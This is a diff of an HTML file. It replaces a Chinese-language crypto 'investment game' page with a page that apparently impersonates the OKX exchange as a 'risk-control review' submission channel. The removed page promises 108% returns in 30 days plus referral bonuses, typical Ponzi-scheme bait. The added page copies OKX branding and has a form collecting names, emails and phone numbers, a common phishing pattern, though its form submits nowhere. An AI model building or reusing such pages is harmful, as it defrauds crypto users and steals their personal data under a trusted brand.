@@ -1,123 +1,178 @@
 <!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <link
-      rel="shortcut icon"
-      href="./assets/images/logo.png"
-      type="image/x-icon"
-    />
-    <script src="https://unpkg.com/@phosphor-icons/web"></script>
-    <link rel="stylesheet" href="./assets/css/swiper.min.css" />
-    <title>Chain Master HTML PWA Template</title>
-  <link href="style.css" rel="stylesheet"></head>
-  <body>
-    <div class="fixed inset-0 z-20 splashModal">
-      <div
-        class="container bg-n900 h-dvh relative overflow-hidden flex justify-center items-center text-white"
-      >
-        <div
-          class="w-[582px] h-[582px] rounded-full bg-g300 absolute -top-24 -left-20 blur-[575px]"
-        ></div>
+<html lang="zh-Hant">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>歐易 - 風控審查人工通道</title>
+    <link rel="icon" type="image/png" href="app_icon.png">
+    <!-- 引入 Bootstrap -->
+    <link rel="stylesheet" href="style.css">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            background-color: #000;
+            color: #fff;
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
 
-        <div
-          class="size-[105px] rounded-full bg-white opacity-5 top-40 -left-14 absolute"
-        ></div>
-        <div
-          class="size-[105px] rounded-full bg-white opacity-5 top-20 -right-14 absolute"
-        ></div>
+        /* Header */
+        .header {
+            background-color: #111;
+            padding: 1rem;
+        }
+        .logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+        }
+        .register-btn {
+            background-color: #fff;
+            color: #000;
+            border: none;
+            padding: 0.5rem 1rem;
+            border-radius: 5px;
+        }
 
-        <div
-          class="size-[105px] rounded-full bg-white opacity-5 bottom-10 -left-14 absolute"
-        ></div>
-        <div
-          class="size-[105px] rounded-full bg-white opacity-5 bottom-40 -right-14 absolute"
-        ></div>
+        /* Hero Section */
+        .hero-section {
+            text-align: center;
+            margin: 3rem 0;
+        }
+        .hero-section h1 {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+        }
+        .email-form input {
+            border-radius: 5px;
+        }
 
-        <div class="flex flex-col justify-center items-center gap-4">
-          <img src="./assets/images/logo.png" alt="" />
-          <p class="text-3xl font-bold">
-            Chain <span class="text-g300">Master</span>
-          </p>
-        </div>
-      </div>
-    </div>
+        /* App Banner */
+        .app-banner {
+            background-color: #f5f5f5;
+            color: #000;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 1rem;
+            border-radius: 10px;
+            max-width: 600px;
+            margin: 2rem auto;
+            margin-left: 20px;
+            margin-right: 20px;
+            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
+            position: relative;
+        }
+        .app-banner .logo {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+        .app-banner .logo img {
+            width: 50px;
+            height: 50px;
+            border-radius: 10px;
+        }
+        .app-banner .content {
+            flex: 1;
+        }
+        .app-banner .content p {
+            margin: 0;
+        }
+        .app-banner .content .title {
+            font-weight: bold;
+            font-size: 1.2rem;
+        }
+        .app-banner .content .subtitle {
+            font-size: 0.9rem;
+            color: #666;
+        }
+        .app-banner .btn-download {
+            background-color: #fff;
+            color: #000;
+            border: 1px solid #ccc;
+            border-radius: 20px;
+            padding: 0.3rem 1.5rem;
+            font-size: 1rem;
+            cursor: pointer;
+            margin-right: 20px;
+        }
+        .app-banner .close-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            font-size: 1rem;
+            color: #666;
+            cursor: pointer;
+            background: none;
+            border: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header class="header d-flex justify-content-between align-items-center">
+        <div class="logo"><img height="36" src="logo.png"/></div>
+        <button class="register-btn">登入</button>
+    </header>
 
-    <div
-      class="container bg-n900 h-dvh relative overflow-hidden flex justify-center items-center text-white"
-    >
-      <div
-        class="w-[582px] h-[582px] rounded-full bg-g300 absolute -top-32 -left-20 blur-[575px]"
-      ></div>
-      <div class="swiper onboarding-steps-slider">
-        <div class="swiper-wrapper">
-          <div class="swiper-slide">
-            <div class="p-6 relative z-20">
-              <img src="./assets/images/strategy-development.png" alt="" />
-              <div class="pt-8">
-                <p class="text-3xl font-bold">
-                  運用
-                  <span class="text-g300">策略</span>，創造被動收入！
-                </p>
-                <p class="text-n70 text-sm pt-5">
-                  基於智能合約的創新投資遊戲，透明、公平、無盡可能。
-                </p>
-              </div>
+    <!-- Main Section -->
+    <main>
+        <!-- Hero Section -->
+        <section class="hero-section">
+            <h1>風控審查人工通道</h1>
+            <p class="mb-4">風控審查資料提交自助通道</p>
+            <div class="container">  
+                <form id="contact" action="" method="post">
+                    <h3>Colorlib Contact Form</h3>
+                    <h4>Contact us for custom quote</h4>
+                    <fieldset>
+                        <input placeholder="Your name" type="text" tabindex="1" required autofocus>
+                    </fieldset>
+                    <fieldset>
+                        <input placeholder="Your Email Address" type="email" tabindex="2" required>
+                    </fieldset>
+                    <fieldset>
+                        <input placeholder="Your Phone Number (optional)" type="tel" tabindex="3" required>
+                    </fieldset>
+                    <fieldset>
+                        <input placeholder="Your Web Site (optional)" type="url" tabindex="4" required>
+                    </fieldset>
+                    <fieldset>
+                        <textarea placeholder="Type your message here...." tabindex="5" required></textarea>
+                    </fieldset>
+                    <fieldset>
+                        <button name="submit" type="submit" id="contact-submit" data-submit="...Sending">提交</button>
+                    </fieldset>
+                </form>
             </div>
-          </div>
-          <div class="swiper-slide">
-            <div class="p-6 relative z-20">
-              <img src="./assets/images/smart-contracts.png" alt="" />
-              <div class="pt-8">
-                <p class="text-3xl font-bold">
-                  遊戲
-                  <span class="text-g300">規則透明</span>，機會觸手可及！
-                </p>
-                <p class="text-n70 text-sm pt-5">
-                  <ul>
-                    <li>	1.	高回報：合約資金30日鎖定期，到期即返 108% 本金與利息！</li>
-                      <li>2.	智動出金：每日 00:00 按時返還當日所有已到期合約，規則公開透明。</li>
-                      <li>3.	推薦獎金：邀請好友參與，立享額外 5% 推薦獎勵！</li>
-                      <li>4.	安全與公正：基於智能合約，資金流動可追蹤，完全去中心化。</li>
-                      <li>5.  數據透明：平台預設提供詳盡數據分析，風險評比。</li>
-                    </ul>
-                </p>
-              </div>
+        </section>
+
+        <!-- App Banner Section -->
+        <section class="app-banner">
+            <div class="logo">
+                <img src="app_icon.png" alt="Logo">
+                <div class="content">
+                    <p class="title">歐易 OKX APP</p>
+                    <p class="subtitle">移動交易，隨時隨地</p>
+                </div>
             </div>
-          </div>
-          <div class="swiper-slide">
-            <div class="p-6 relative z-20">
-              <img src="./assets/images/rich-man.png" alt="" />
-              <div class="pt-8">
-                <p class="text-3xl font-bold">
-                  立即啟動你的
-                  <span class="text-g300">財富增長</span> 之旅！
-                </p>
-                <p class="text-n70 text-sm pt-5">
-                  點擊下方按鈕，成為我們的一員，打造自己的收益曲線！
-                </p>
-              </div>
-            </div>
-          </div>
-        </div>
-        <div class="flex justify-between items-center w-full px-6">
-          <div class="swiper-pagination onBoardingsliderPagingation"></div>
-          <div class="nextButton">
-            <div class="ara-next">
-              <button
-                class="text-white flex justify-center items-center bg-g300 rounded-full text-2xl p-4">
-                <i class="ph ph-caret-right"></i>
-              </button>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-    <!-- ==== js dependencies start ==== -->
-    <script src="./assets/js/main.js"></script>
-    <script src="./assets/js/plugins/plugins.js"></script>
-    <script src="./assets/js/plugins/plugin-custom.js"></script>
-    <script src="./assets/js/plugins/passkey.js"></script>
-  <script defer src="index.js"></script></body>
+            <button class="btn-download">下載</button>
+            <button class="close-btn">&times;</button>
+        </section>
+    </main>
+
+    <!-- 引入 Bootstrap JS -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        // 關閉 App Banner
+        document.querySelector('.close-btn').addEventListener('click', function() {
+            document.querySelector('.app-banner').style.display = 'none';
+        });
+
+        // 下載 App
+        document.querySelector('.btn-download').addEventListener('click', function() {
+            location.href = 'https://apps.apple.com/us/app/okx-buy-bitcoin-btc-crypto/id1327268470d';
+        });
+    </script>
+</body>
 </html>
